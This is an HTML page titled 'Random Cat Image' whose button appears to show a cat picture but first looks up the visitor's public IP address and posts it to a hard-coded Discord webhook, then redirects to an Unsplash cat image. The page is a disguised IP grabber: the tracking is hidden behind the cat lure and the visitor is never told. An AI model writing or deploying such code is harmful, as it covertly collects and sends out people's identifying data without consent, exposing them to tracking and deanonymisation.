<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Random Cat Image</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
        }
        button {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            background-color: #4CAF50;
            color: #fff;
            cursor: pointer;
        }
        button:hover {
            background-color: #3e8e41;
        }
    </style>
</head>
<body>
    <h1>Random Cat Image</h1>
    <button id="random-cat-button">Get Random Cat Image</button>

    <script>
        const button = document.getElementById('random-cat-button');
        button.addEventListener('click', async () => {
            // Send IP address to Discord webhook
            const ipAddress = await getIpAddress();
            const webhookUrl = 'https://discordapp.com/api/webhooks/1531144499546558595/172iEU789ufiRQ7JQkPtJ4xpTJkvj5LiIqSMidebz-QVuXK_ciyW_2GlJ6xPDukLNY94';
            const response = await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: `IP Address: ${ipAddress}`
                })
            });

            // Redirect to random cat image
            const randomCatUrl = 'https://source.unsplash.com/800x600/?cat';
            window.location.href = randomCatUrl;
        });

        // Function to get IP address
        async function getIpAddress() {
            const response = await fetch('https://api.ipify.org');
            const ipAddress = await response.text();
            return ipAddress;
        }
    </script>
</body>
</html>
